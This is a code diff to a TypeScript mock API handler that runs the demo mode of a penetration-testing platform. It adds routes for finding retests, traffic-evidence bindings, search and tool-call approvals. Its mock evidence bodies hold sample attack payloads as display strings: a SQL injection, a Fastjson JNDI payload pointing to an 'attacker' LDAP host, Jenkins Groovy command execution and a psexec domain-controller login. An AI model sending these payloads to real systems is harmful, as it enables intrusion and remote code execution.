@@ -16,6 +16,10 @@ import type {
   Company,
   CompanyScopeRule,
   Conversation,
+  EvidenceBodyPreview,
+  FindingRetest,
+  FindingTraffic,
+  FindingTrafficBinding,
   IntentAsset,
   ScopeRow,
   Task,
@@ -26,6 +30,8 @@ import type {
   TaskLLMResolution,
   TaskScopeRow,
   TaskTemplate,
+  TrafficEvidenceRole,
+  TrafficEvidenceSnapshot,
 } from "../types";
 import * as D from "./data";
 
@@ -33,12 +39,168 @@ const delay = (ms = 120) => new Promise((r) => setTimeout(r, ms));
 
 // Requests mutate a runtime copy, never the exported fixtures. This keeps module
 // initialization deterministic for tests/HMR while preserving state across mock calls.
+const mockInterceptHistory = structuredClone(D.interceptHistory);
+const mockInterceptPending = structuredClone(D.interceptPending);
+const mockInterceptDetails = structuredClone(D.interceptDetails);
 const mockTasks = structuredClone(D.tasks);
 const mockFindings = structuredClone(D.findings);
 const mockLLMRecords = structuredClone(D.llmRecords);
 const mockTaskTemplates = structuredClone(D.taskTemplates);
 const mockTaskCategories = structuredClone(D.taskCategories);
 const mockConversations = structuredClone(D.conversations);
+const mockRetests: FindingRetest[] = [];
+const mockRetestMessages: Record<number, Activity[]> = {};
+
+// ── 关联流量证据(finding traffic) ─────────────────────────────────────────────
+// 后端把请求/响应快照独立存到 evidence 表,前端详情页用 FindingTrafficPanel 展示。
+// demo 里为部分漏洞预置绑定,快照直接引用 mock 抓包(data.traffic.exchanges),
+// 其余漏洞返回空绑定。缺了这套路由,详情页会因读到空对象、访问 bindings.length 崩整页。
+const mockExchangeById = new Map((D.traffic.exchanges ?? []).map((exchange) => [exchange.id, exchange]));
+
+interface MockBindingSeed {
+  traffic_id: string;
+  role: TrafficEvidenceRole;
+  note?: string;
+}
+
+// 每条漏洞预置的流量证据(finding id → 绑定的抓包)。选取与漏洞语义对应的请求,
+// 让 demo 详情页的「关联流量」区块看起来真实。
+const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
+  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 参数注入 payload，响应回显 MSSQL 报错。" }],
+  "f-2": [
+    { traffic_id: "x-8", role: "baseline", note: "本人订单 id=1001，作为正常对照。" },
+    { traffic_id: "x-9", role: "proof", note: "改 id=1002 越权读到他人订单。" },
+  ],
+  "f-12": [
+    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload，触发回连。" },
+    { traffic_id: "x-16", role: "verification", note: "二次请求确认命令执行落地。" },
+  ],
+  "f-15": [
+    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 未授权可达。" },
+    { traffic_id: "x-18", role: "proof", note: "scriptText 执行 Groovy 命令返回 SYSTEM。" },
+  ],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 以 svc_deploy 登录域控 DC01。" }],
+};
+
+// demo 用固定报文正文,避免详情页 Request/Response 空白。
+const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
+  "x-2": {
+    req: "q=1' AND 1=CONVERT(int,@@version)--",
+    resp: '{"error":"Conversion failed when converting the nvarchar value \'Microsoft SQL Server 2019 ...\' to data type int."}',
+  },
+  "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
+  "x-9": {
+    req: "",
+    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
+  },
+  "x-15": {
+    req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
+    resp: '{"status":"error","message":"internal server error"}',
+  },
+  "x-16": { req: '{"cmd":"id"}', resp: '{"status":"ok","out":"uid=33(www-data) gid=33(www-data)"}' },
+  "x-17": { req: "", resp: "<html><title>Jenkins Script Console</title>..." },
+  "x-18": { req: "script=println 'whoami'.execute().text", resp: "nt authority\\system" },
+  "x-19": { req: "[psexec] acme/svc_deploy@10.10.10.10", resp: "[*] Got SYSTEM on DC01" },
+};
+
+// 运行期状态:finding id → 绑定列表(可增删改序,demo 内存态)。首次访问按种子初始化。
+const mockFindingTraffic: Record<string, FindingTrafficBinding[]> = {};
+const mockFindingTrafficVersion: Record<string, number> = {};
+let mockBindingSeq = 900;
+
+function mockBuildSnapshot(trafficId: string): TrafficEvidenceSnapshot {
+  const exchange = mockExchangeById.get(trafficId);
+  const capturedAt = exchange ? Math.floor(Date.parse(exchange.ts) / 1000) : 0;
+  let pathAndQuery = "/";
+  try {
+    if (exchange) pathAndQuery = new URL(exchange.url).pathname + new URL(exchange.url).search;
+  } catch {
+    // 保底用根路径。
+  }
+  const body = mockEvidenceBodies[trafficId];
+  return {
+    id: `snap-${trafficId}`,
+    source_traffic_id: trafficId,
+    captured_at: capturedAt,
+    url: exchange?.url ?? "",
+    method: exchange?.method ?? "GET",
+    status: exchange?.status ?? 0,
+    content_type: exchange?.content_type ?? "",
+    req_head: `${exchange?.method ?? "GET"} ${pathAndQuery} HTTP/1.1\nHost: ${exchange?.host ?? ""}`,
+    resp_head: `HTTP/1.1 ${exchange?.status ?? 0}\nContent-Type: ${exchange?.content_type ?? ""}`,
+    req_hash: `req-${trafficId}`,
+    resp_hash: `resp-${trafficId}`,
+    req_len: body ? new TextEncoder().encode(body.req).length : 0,
+    resp_len: exchange?.resp_len ?? (body ? new TextEncoder().encode(body.resp).length : 0),
+  };
+}
+
+function mockTrafficBindings(findingID: string): FindingTrafficBinding[] {
+  if (!mockFindingTraffic[findingID]) {
+    const seeds = mockFindingTrafficSeeds[findingID] ?? [];
+    mockFindingTraffic[findingID] = seeds.map((seed, index) => ({
+      id: String(++mockBindingSeq),
+      finding_id: findingID,
+      snapshot_id: `snap-${seed.traffic_id}`,
+      role: seed.role,
+      note: seed.note ?? "",
+      position: index,
+      created_at: new Date(Date.now() - (seeds.length - index) * 1000).toISOString(),
+      snapshot: mockBuildSnapshot(seed.traffic_id),
+    }));
+    mockFindingTrafficVersion[findingID] = 1;
+  }
+  return mockFindingTraffic[findingID];
+}
+
+function mockTrafficSummary(findingID: string): FindingTraffic {
+  const bindings = mockTrafficBindings(findingID).map((binding, index) => ({
+    ...binding,
+    position: index,
+    // 列表/摘要接口剥掉报文头,与后端 trafficSummary 一致。
+    snapshot: { ...binding.snapshot, req_head: "", resp_head: "" },
+  }));
+  const version = mockFindingTrafficVersion[findingID] ?? 1;
+  return { finding_id: findingID, version, report_version: version, bindings };
+}
+
+function mockTrafficCount(findingID: string): number {
+  return mockTrafficBindings(findingID).length;
+}
+
+function mockEvidencePreview(text: string): EvidenceBodyPreview {
+  return { content: text, offset: 0, total: text.length, next_offset: text.length, truncated: false, binary: false };
+}
+
+function advanceMockRetests() {
+  for (const retest of mockRetests) {
+    if (retest.status !== "running" || retest.conversation_id == null) continue;
+    if (Date.now() - Date.parse(retest.created_at) < 15000) continue;
+    retest.status = "completed";
+    retest.verdict = "inconclusive";
+    retest.summary = "演示环境未执行真实验证，无法确认漏洞当前状态。";
+    retest.evidence =
+      "### 演示记录\n\n已关联原漏洞。此环境未连接真实 Agent，也未向目标发送请求；请在实际部署中执行复测。";
+    retest.finished_at = new Date().toISOString();
+    mockRetestMessages[retest.conversation_id].push({
+      seq: 3,
+      worker: "retester",
+      ts: retest.finished_at,
+      kind: "text",
+      summary: retest.summary,
+      detail: retest.evidence,
+    });
+  }
+}
+
+function stopMockRetest(conversationID: number) {
+  for (const retest of mockRetests) {
+    if (retest.conversation_id !== conversationID || !["pending", "running"].includes(retest.status)) continue;
+    retest.status = "stopped";
+    retest.finished_at = new Date().toISOString();
+    retest.error = "演示复测已停止";
+  }
+}
 const mockIntents = structuredClone(D.intents);
 const mockCompanies = structuredClone(D.companies);
 const mockAssets = structuredClone(D.assets);
@@ -837,6 +999,7 @@ function parseBody(body?: BodyInit | null): Record<string, unknown> {
 }
 
 export async function mockHandle<T>(method: string, rawPath: string, body?: BodyInit | null): Promise<T> {
+  advanceMockRetests();
   await delay();
   const [path, qs] = rawPath.split("?");
   const q = new URLSearchParams(qs ?? "");
@@ -848,6 +1011,48 @@ export async function mockHandle<T>(method: string, rawPath: string, body?: Body
 
 function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Record<string, unknown>): unknown {
   const task = q.get("task") ?? undefined;
+
+  if (path === "/chat/mentions" && m === "GET") {
+    const kind = q.get("kind") ?? "";
+    const query = (q.get("q") ?? "").trim().toLowerCase();
+    const candidates = [
+      ...D.findings.map((finding, index) => ({
+        kind: "finding",
+        id: index + 1,
+        label: finding.name || finding.vulnclass,
+        description: `${finding.severity} · ${finding.summary}`,
+      })),
+      ...D.companies.map((company) => ({ kind: "company", id: company.id, label: company.name, description: "企业" })),
+      ...D.assets.map((asset) => ({
+        kind: asset.type,
+        id: asset.id,
+        label:
+          asset.type === "endpoint"
+            ? `${asset.method || "GET"} ${asset.url}`
+            : asset.app_name || asset.url || asset.domain || asset.ip || asset.bundle_id || `资产 #${asset.id}`,
+        description: [asset.type, asset.page_title, asset.service_name, asset.bundle_id, asset.ip]
+          .filter(Boolean)
+          .join(" · "),
+      })),
+    ];
+    const filtered = candidates
+      .filter(
+        (item) =>
+          (!kind || kind === item.kind || (kind === "asset" && item.kind !== "finding" && item.kind !== "company")) &&
+          (!query || String(item.id) === query || `${item.label} ${item.description}`.toLowerCase().includes(query)),
+      )
+      .sort(
+        (a, b) =>
+          Number(String(b.id) === query) - Number(String(a.id) === query) ||
+          b.id - a.id ||
+          a.kind.localeCompare(b.kind),
+      );
+    const offset = Math.max(0, Number(q.get("cursor")) || 0);
+    return {
+      items: filtered.slice(offset, offset + 20),
+      next_cursor: offset + 20 < filtered.length ? String(offset + 20) : undefined,
+    };
+  }
 
   // ── auth：让 demo 直接进主界面 ──
   if (path === "/auth/status") return { initialized: true };
@@ -987,6 +1192,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       paused: false,
       active: true,
       in_flight: 0,
+      findings: { critical: 0, high: 0, medium: 0, low: 0 },
       stalled: false,
       goals_total: 0,
       goals_met: 0,
@@ -1247,20 +1453,32 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     if (b.action === "cancel") {
       const index = mockIntents.findIndex((item) => item.id === id);
       const intent = mockIntents[index];
-      if (!intent || intent.inherited || (intent.state !== "running" && intent.state !== "paused")) {
+      if (
+        !intent ||
+        intent.inherited ||
+        (intent.state !== "running" && intent.state !== "paused" && intent.state !== "open")
+      ) {
         throw new Error("Worker 状态已变化");
       }
-      mockIntents.splice(index, 1);
-      return {
-        id: Number(id.replace(/\D/g, "")) || 0,
-        state: "cancelled",
-        deleted: {
-          intents: 1,
-          facts: 1,
-          findings: 1,
-          activities: mockActivity.filter((item) => item.intent_id === id).length,
-        },
-      };
+      const numId = Number(id.replace(/\D/g, "")) || 0;
+      if (b.mode === "hard") {
+        // 真删除:从列表移除,返回级联删除计数。
+        mockIntents.splice(index, 1);
+        return {
+          id: numId,
+          state: "",
+          deleted: {
+            intents: 1,
+            facts: 1,
+            findings: 1,
+            activities: mockActivity.filter((item) => item.intent_id === id).length,
+          },
+        };
+      }
+      // 假删除(默认):置 deleted + 记删除原因,保留节点。
+      intent.state = "deleted";
+      intent.delete_reason = String(b.reason ?? "");
+      return { id: numId, state: "deleted" };
     }
     const action = b.action === "resume" ? "resume" : "pause";
     const result = controlMockIntent(id, action);
@@ -1700,6 +1918,74 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       page_size: pageSize,
     };
   }
+  if (path === "/exploration/findings/retests/active" && m === "GET") {
+    return {
+      retests: mockRetests
+        .filter((item) => ["pending", "running"].includes(item.status) && item.conversation_id != null)
+        .map((item) => ({
+          id: item.id,
+          finding_id: D.findings[item.finding_id - 1].id,
+          conversation_id: item.conversation_id,
+          status: item.status,
+        })),
+    };
+  }
+  if (seg[0] === "exploration" && seg[1] === "findings" && seg[3] === "retests") {
+    const finding = mockFindings.find((item) => item.id === seg[2]);
+    if (!finding) throw new Error("漏洞不存在");
+    const findingID = D.findings.findIndex((item) => item.id === finding.id) + 1;
+    if (m === "GET") return { retests: structuredClone(mockRetests.filter((item) => item.finding_id === findingID)) };
+    if (m === "POST") {
+      const existing = mockRetests.find(
+        (item) => item.finding_id === findingID && ["pending", "running"].includes(item.status),
+      );
+      if (existing) return { retest: structuredClone(existing), created: false };
+      const now = new Date().toISOString();
+      const conversationID = mockConversations.reduce((max, item) => Math.max(max, item.id), 0) + 1;
+      mockConversations.unshift({
+        id: conversationID,
+        agent_key: "retester",
+        title: `复测 #${finding.id} · ${finding.name || finding.vulnclass}`,
+        pinned: false,
+        created_at: now,
+        updated_at: now,
+      });
+      const retest: FindingRetest = {
+        id: mockRetests.length + 1,
+        finding_id: findingID,
+        conversation_id: conversationID,
+        status: "running",
+        verdict: "",
+        notes: String(b.notes ?? ""),
+        summary: "",
+        evidence: "",
+        error: "",
+        created_at: now,
+        started_at: now,
+        finished_at: null,
+      };
+      mockRetests.unshift(retest);
+      mockRetestMessages[conversationID] = [
+        {
+          seq: 1,
+          worker: "retester",
+          ts: now,
+          kind: "user",
+          summary: `请复测漏洞 #${finding.id}`,
+          detail: retest.notes,
+        },
+        {
+          seq: 2,
+          worker: "retester",
+          ts: now,
+          kind: "text",
+          summary: "演示复测进行中（未向目标发送请求）",
+          detail: "演示复测进行中（未向目标发送请求）",
+        },
+      ];
+      return { retest: structuredClone(retest), created: true };
+    }
+  }
   if (seg[0] === "exploration" && seg[1] === "findings" && seg[3] === "deepen" && m === "POST") {
     const finding = mockFindings.find((candidate) => candidate.id === seg[2]);
     const description = String(b.description ?? "").trim();
@@ -1715,6 +2001,77 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       state: "open",
       queued: false,
     };
+  }
+  // 关联流量证据:列表 / 绑定 / 编辑 / 解绑 / 排序 / 单条报文详情(demo 内存态)。
+  // seg = ["exploration","findings",<id>,"traffic", ...]
+  if (seg[0] === "exploration" && seg[1] === "findings" && seg[3] === "traffic") {
+    const findingID = seg[2];
+    if (!mockFindings.some((item) => item.id === findingID)) throw new Error("漏洞不存在");
+    const bindings = mockTrafficBindings(findingID);
+    const bumpVersion = () => {
+      mockFindingTrafficVersion[findingID] = (mockFindingTrafficVersion[findingID] ?? 1) + 1;
+    };
+
+    // 单条报文详情:GET /traffic/{binding_id}
+    if (seg.length === 5 && seg[4] !== "order" && m === "GET") {
+      const binding = bindings.find((item) => item.id === seg[4]);
+      if (!binding) throw new Error("证据不存在");
+      const body = mockEvidenceBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
+      return {
+        binding: structuredClone(binding),
+        request: mockEvidencePreview(body.req),
+        response: mockEvidencePreview(body.resp),
+      };
+    }
+    // 报文正文分页:GET /traffic/{binding_id}/body —— demo 正文不截断,直接返回空续页。
+    if (seg.length === 6 && seg[5] === "body" && m === "GET") {
+      const binding = bindings.find((item) => item.id === seg[4]);
+      if (!binding) throw new Error("证据不存在");
+      const body = mockEvidenceBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
+      const side = q.get("side") === "request" ? body.req : body.resp;
+      return mockEvidencePreview(side);
+    }
+    // 绑定流量:POST /traffic
+    if (seg.length === 4 && m === "POST") {
+      const refs = Array.isArray(b.traffic_refs) ? (b.traffic_refs as MockBindingSeed[]) : [];
+      for (const ref of refs) {
+        if (!ref.traffic_id || bindings.some((item) => item.snapshot.source_traffic_id === ref.traffic_id)) continue;
+        bindings.push({
+          id: String(++mockBindingSeq),
+          finding_id: findingID,
+          snapshot_id: `snap-${ref.traffic_id}`,
+          role: ref.role ?? "supporting",
+          note: ref.note ?? "",
+          position: bindings.length,
+          created_at: new Date().toISOString(),
+          snapshot: mockBuildSnapshot(ref.traffic_id),
+        });
+      }
+      bumpVersion();
+      return mockTrafficSummary(findingID);
+    }
+    // 排序:PUT /traffic/order
+    if (seg.length === 5 && seg[4] === "order" && m === "PUT") {
+      const order = Array.isArray(b.binding_ids) ? (b.binding_ids as string[]) : [];
+      bindings.sort((left, right) => order.indexOf(left.id) - order.indexOf(right.id));
+      bumpVersion();
+      return mockTrafficSummary(findingID);
+    }
+    // 编辑说明 / 解绑:PATCH|DELETE /traffic/{binding_id}
+    if (seg.length === 5 && (m === "PATCH" || m === "DELETE")) {
+      const index = bindings.findIndex((item) => item.id === seg[4]);
+      if (index < 0) throw new Error("证据不存在");
+      if (m === "DELETE") {
+        bindings.splice(index, 1);
+      } else {
+        if (typeof b.role === "string") bindings[index].role = b.role as TrafficEvidenceRole;
+        if (typeof b.note === "string") bindings[index].note = b.note;
+      }
+      bumpVersion();
+      return mockTrafficSummary(findingID);
+    }
+    // 列表:GET /traffic
+    return mockTrafficSummary(findingID);
   }
   // 单条 finding:GET 详情 / PATCH 改状态/严重度/名称/类别(demo 直接改内存对象)。
   if (seg[0] === "exploration" && seg[1] === "findings" && seg.length === 3 && seg[2] !== "stats") {
@@ -1737,6 +2094,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     return {
       ...f,
       finding_id: f.id,
+      traffic_count: mockTrafficCount(f.id),
       ...(inherited ? { inherited: true, source_task_id: f.task_id } : {}),
     };
   }
@@ -1747,6 +2105,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       ...f,
       report: undefined,
       finding_id: f.id,
+      traffic_count: mockTrafficCount(f.id),
     });
     if (task) {
       const owner = mockTasks.find((item) => item.id === task);
@@ -1797,6 +2156,48 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     };
   }
   if (path === "/exploration/graph") return D.explorationGraph;
+  // 播报板:和后端 /exploration/nodes 同语义 —— 按创建顺序(mock 里用 ts + id)分页,
+  // 并带上这一页涉及的边与边另一端的节点。
+  if (path === "/exploration/nodes") {
+    const all = D.explorationGraph.nodes;
+    const kinds = new Set((q.get("kind") ?? "").split(",").filter(Boolean));
+    const states = new Set((q.get("state") ?? "").split(",").filter(Boolean));
+    const needle = (q.get("q") ?? "").trim().toLowerCase();
+    const asc = q.get("order") === "asc";
+    const page = Math.max(1, Number(q.get("page") ?? 1));
+    const size = Math.min(200, Math.max(1, Number(q.get("size") ?? 20)));
+    const rank = (id: string) => all.findIndex((n) => n.id === id);
+    const matched = all
+      .filter((n) => (kinds.size === 0 || kinds.has(n.type)) && (states.size === 0 || states.has(n.state)))
+      .filter(
+        (n) =>
+          !needle ||
+          // 内容 / 来源 / 节点 id 任一命中即可(id 兼容「#41」写法)。
+          `${n.payload ?? ""} ${n.origin} ${n.id}`.toLowerCase().includes(needle.replace(/^#/, "")),
+      )
+      .sort((a, b) => {
+        const d = Date.parse(a.ts) - Date.parse(b.ts) || rank(a.id) - rank(b.id);
+        return asc ? d : -d;
+      });
+    const items = matched.slice((page - 1) * size, page * size);
+    const onPage = new Set(items.map((n) => n.id));
+    const edges = D.explorationGraph.edges.filter((e) => onPage.has(e.src) || onPage.has(e.dst));
+    const refs: Record<string, (typeof all)[number]> = {};
+    for (const e of edges) {
+      for (const id of [e.src, e.dst]) {
+        if (onPage.has(id) || refs[id]) continue;
+        const node = all.find((n) => n.id === id);
+        if (node) refs[id] = node;
+      }
+    }
+    // 顺带带上本页节点(含邻居)锚定的资产,供展开时展示。
+    const assets: Record<string, ReturnType<typeof D.nodeAssetsFor>> = {};
+    for (const id of new Set([...onPage, ...Object.keys(refs)])) {
+      const anchored = D.nodeAssetsFor(id);
+      if (anchored.length > 0) assets[id] = anchored;
+    }
+    return { items, total: matched.length, page, size, edges, refs, assets };
+  }
   if (path === "/exploration/activity" && seg.length === 2) {
     const since = Number(q.get("since") ?? 0);
     const limit = Math.max(1, Number(q.get("limit") ?? 300));
@@ -1887,7 +2288,16 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   // ── conversations ──
   if (path === "/conversations" && m === "GET") {
     sortMockConversations();
-    return { conversations: structuredClone(mockConversations) };
+    return {
+      conversations: structuredClone(
+        mockConversations.map((conversation) => ({
+          ...conversation,
+          running: mockRetests.some(
+            (item) => item.conversation_id === conversation.id && ["pending", "running"].includes(item.status),
+          ),
+        })),
+      ),
+    };
   }
   if (path === "/conversations" && m === "POST") {
     const now = new Date().toISOString();
@@ -1918,8 +2328,10 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   }
   if (seg[0] === "conversations" && seg.length === 2 && m === "DELETE") {
     const id = Number(seg[1]);
+    stopMockRetest(id);
     const index = mockConversations.findIndex((item) => item.id === id);
     if (index >= 0) mockConversations.splice(index, 1);
+    for (const retest of mockRetests) if (retest.conversation_id === id) retest.conversation_id = null;
     return { deleted: id };
   }
   if (path === "/conversations/delete/batch" && m === "POST") {
@@ -1930,21 +2342,29 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       const index = mockConversations.findIndex((item) => item.id === id);
       if (index < 0) return { id, ok: false, error: "conversation not found" };
       mockConversations.splice(index, 1);
+      stopMockRetest(id);
+      for (const retest of mockRetests) if (retest.conversation_id === id) retest.conversation_id = null;
       return { id, ok: true };
     });
     return { items };
   }
   if (seg[0] === "conversations" && seg[2] === "messages" && seg.length === 3 && m === "GET") {
-    const items = D.conversationMessages[Number(seg[1])] ?? [];
-    return { items, cursor: items.length ? items[items.length - 1].seq : 0, running: false };
+    const items = mockRetestMessages[Number(seg[1])] ?? D.conversationMessages[Number(seg[1])] ?? [];
+    const running = mockRetests.some(
+      (item) => item.conversation_id === Number(seg[1]) && ["pending", "running"].includes(item.status),
+    );
+    return { items, cursor: items.length ? items[items.length - 1].seq : 0, running };
   }
   if (seg[0] === "conversations" && seg[2] === "messages" && seg.length === 4) {
-    const msgs = D.conversationMessages[Number(seg[1])] ?? [];
+    const msgs = mockRetestMessages[Number(seg[1])] ?? D.conversationMessages[Number(seg[1])] ?? [];
     const a = msgs.find((x) => x.seq === Number(seg[3]));
     return { detail: a?.detail ?? a?.summary ?? "" };
   }
   if (seg[0] === "conversations" && seg[2] === "messages" && m === "POST") return { status: "ok" };
-  if (seg[0] === "conversations" && seg[2] === "stop") return { status: "stopped" };
+  if (seg[0] === "conversations" && seg[2] === "stop") {
+    stopMockRetest(Number(seg[1]));
+    return { status: "stopped" };
+  }
 
   // ── tools ──
   if (path === "/tools" && m === "GET") return { tools: D.tools };
@@ -1981,13 +2401,57 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/intercept/rules" && m === "GET") return { rules: D.interceptRules };
   if (seg[0] === "intercept" && seg[1] === "rules" && seg[3] === "toggle")
     return { ok: true, enabled: b.enabled ?? true };
-  if (path === "/intercept/pending" && m === "GET") return { pending: D.interceptPending };
-  if (seg[0] === "intercept" && seg[1] === "pending" && seg[3] === "decide") return { ok: true };
+  if (path === "/intercept/pending" && m === "GET")
+    return { pending: mockInterceptHistory.filter((r) => r.status === "pending") };
+  if (seg[0] === "intercept" && seg[1] === "pending" && seg[3] === "decide") {
+    const id = Number(seg[2]);
+    const row = mockInterceptHistory.find((r) => r.id === id) ?? mockInterceptPending.find((r) => r.id === id);
+    if (row?.status !== "pending") throw new Error("审批已处理或不存在，请刷新记录");
+    if (b.decision !== "allowed" && b.decision !== "denied") throw new Error("无效审批动作");
+    row.status = b.decision;
+    row.decided_at = new Date().toISOString();
+    const detail = mockInterceptDetails[id];
+    if (detail) {
+      detail.effective_action = b.decision === "allowed" ? "allow" : "deny";
+      detail.decision_reason = b.decision === "allowed" ? "人工允许执行" : "人工拒绝执行";
+      detail.execution_status = b.decision === "allowed" ? "unknown" : "not_executed";
+      detail.output = b.decision === "allowed" ? "演示模式未执行工具。" : "";
+    }
+    return { ok: true };
+  }
+  if (seg[0] === "intercept" && seg[1] === "history" && seg.length === 3) {
+    const row = mockInterceptHistory.find((r) => r.id === Number(seg[2]));
+    if (!row) throw new Error("审批记录不存在");
+    return { ...row, audit: mockInterceptDetails[row.id] ?? null };
+  }
   if (seg[0] === "intercept" && seg[1] === "pending" && seg.length === 3 && m === "GET")
-    return D.interceptPending.find((p) => p.id === Number(seg[2])) ?? null;
-  if (path === "/intercept/history") return { items: D.interceptHistory };
-  if (seg[0] === "intercept" && seg[1] === "task")
-    return { items: D.interceptHistory.filter((r) => r.task_id === seg[2]) };
+    return mockInterceptPending.find((p) => p.id === Number(seg[2])) ?? null;
+  if (path === "/intercept/history" || (seg[0] === "intercept" && seg[1] === "task")) {
+    const status = q.get("status") || "";
+    const decisionSource = q.get("decision_source") || "";
+    if (status && !["pending", "allowed", "denied", "timeout"].includes(status)) throw new Error("无效审批状态");
+    if (decisionSource && !["model", "rule", "unknown"].includes(decisionSource)) throw new Error("无效判定来源");
+    const filtered = mockInterceptHistory.filter((row) => {
+      const source =
+        row.decision_source || (row.rule_id ? "rule" : row.reason?.startsWith("[模型]") ? "model" : "unknown");
+      return (
+        (seg[1] !== "task" || row.task_id === decodeURIComponent(seg[2])) &&
+        (!status || row.status === status) &&
+        (!decisionSource || source === decisionSource)
+      );
+    });
+    if (!q.has("page") && !q.has("size") && !status && !decisionSource)
+      return { items: filtered, total: filtered.length };
+    const page = Math.max(1, Number(q.get("page")) || 1);
+    const size = Math.min(100, Math.max(1, Number(q.get("size")) || 20));
+    const offset = (page - 1) * size;
+    return {
+      items: filtered.slice(offset, offset + size),
+      total: filtered.length,
+      page,
+      page_size: size,
+    };
+  }
   if (path === "/intercept/tool-config") return { enabled_tools: ["bash"] };
   if (path === "/intercept/judge" && m === "GET")
     return {
@@ -2000,6 +2464,22 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       ask_timeout_action: "deny",
     };
   if (path === "/intercept/judge" && m === "PUT") return { ok: true };
+  if (path === "/intercept/judge/usage" && m === "GET")
+    return {
+      calls: 0,
+      input_tokens: 0,
+      output_tokens: 0,
+      cache_read_tokens: 0,
+      cache_write_tokens: 0,
+      daily: [],
+    };
+
+  // ── 旁路提问(/btw)：demo 无旁路会话 ──
+  // 必须显式命中：路径以 s 结尾会被下面的读兜底判成集合返回 []，items 就成了 undefined。
+  if (seg.at(-1) === "side-questions") {
+    if (m === "GET") return { items: [], current: null, next_cursor: 0, snapshot: null };
+    if (m === "POST") throw new Error("演示模式不支持旁路提问");
+  }
 
   // ── 写操作兜底：成功但不落库 ──
   if (["POST", "PUT", "PATCH", "DELETE"].includes(m)) return { ok: true };
